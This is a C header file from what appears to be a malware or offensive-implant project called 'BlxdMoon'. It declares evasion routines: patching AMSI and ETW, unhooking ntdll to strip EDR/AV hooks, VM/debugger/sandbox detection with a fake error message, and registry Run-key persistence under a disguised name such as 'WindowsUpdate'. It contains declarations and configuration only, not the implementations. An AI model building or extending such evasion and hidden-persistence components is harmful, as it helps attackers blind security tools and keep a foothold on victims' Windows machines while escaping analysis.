/**
 * evasion.h - Master Evasion Header for BlxdMoon
 *
 * This header includes all evasion modules and provides
 * the main initialization function.
 *
 * Usage:
 *   if (!InitEvasion()) {
 *       // Running in analysis environment - exit cleanly
 *       return 0;
 *   }
 *   // Continue with normal operation...
 *
 * For MinGW cross-compilation, define DISABLE_EVASION to stub out
 * all evasion functionality (it will always return TRUE).
 */

#ifndef EVASION_H
#define EVASION_H

#include <windows.h>

// ============================================================
// MinGW Cross-Compilation Support
// ============================================================
// Define DISABLE_EVASION when cross-compiling with MinGW to avoid
// compatibility issues with Windows internal structures.
// The evasion functions will be stubbed to always return TRUE.

#ifdef DISABLE_EVASION

// Stub implementations for cross-compilation
static inline BOOL PatchAmsi(void) { return TRUE; }
static inline BOOL PatchEtw(void) { return TRUE; }
static inline BOOL UnhookNtdll(void) { return TRUE; }
static inline char* GetStealthyKeyName(void) { return "WindowsUpdate"; }
static inline BOOL StealthyPersist(void) { return TRUE; }
static inline BOOL InitEvasion(void) { return TRUE; }

// Dummy syscall table
typedef struct { int dummy; } SYSCALL_TABLE;
static SYSCALL_TABLE g_SyscallTable = {0};

#else // Full evasion implementation

// Include all evasion sub-modules
#include "obfuscate.h"
#include "api_resolve.h"
#include "syscalls.h"
#include "anti_analysis.h"

// ============================================================
// Configuration
// ============================================================

// Enable/disable specific evasion techniques
#define EVASION_CHECK_VM            1   // Check for virtual machines
#define EVASION_CHECK_DEBUGGER      1   // Check for debuggers
#define EVASION_CHECK_SANDBOX       1   // Check for sandboxes
#define EVASION_PATCH_AMSI          1   // Patch AMSI
#define EVASION_PATCH_ETW           1   // Patch ETW
#define EVASION_UNHOOK_NTDLL        1   // Unhook ntdll.dll

// Behavior when analysis environment detected
#define EVASION_SHOW_FAKE_ERROR     1   // Show fake error message
#define EVASION_SLEEP_AND_EXIT      0   // Sleep then exit (alternative)

// ============================================================
// Function Declarations (implemented in evasion.c)
// ============================================================

/**
 * Patch AMSI (Antimalware Scan Interface)
 * Makes AmsiScanBuffer return E_INVALIDARG
 *
 * MITRE ATT&CK: T1562.001 - Disable or Modify Tools
 *
 * @return TRUE on success
 */
BOOL PatchAmsi(void);

/**
 * Patch ETW (Event Tracing for Windows)
 * Makes EtwEventWrite return success without logging
 *
 * MITRE ATT&CK: T1562.006 - Indicator Blocking
 *
 * @return TRUE on success
 */
BOOL PatchEtw(void);

/**
 * Unhook ntdll.dll by restoring clean .text section from disk
 * Removes EDR/AV user-mode hooks
 *
 * MITRE ATT&CK: T1562.001 - Disable or Modify Tools
 *
 * @return TRUE on success
 */
BOOL UnhookNtdll(void);

/**
 * Generate a stealthy persistence key name
 * Uses computer name hash for uniqueness
 *
 * @return Static buffer containing key name (do not free)
 */
char* GetStealthyKeyName(void);

/**
 * Stealthy persistence using obfuscated strings
 * Adds registry Run key with innocent-looking name
 *
 * @return TRUE on success
 */
BOOL StealthyPersist(void);

/**
 * Master evasion initialization function
 *
 * Performs:
 * 1. Anti-analysis checks (VM, debugger, sandbox)
 * 2. AMSI bypass
 * 3. ETW patching
 * 4. ntdll unhooking
 *
 * @return TRUE if safe to continue, FALSE if analysis environment detected
 */
BOOL InitEvasion(void);

// ============================================================
// Global Syscall Table (defined in evasion.c)
// ============================================================

extern SYSCALL_TABLE g_SyscallTable;

#endif // !DISABLE_EVASION

#endif // EVASION_H
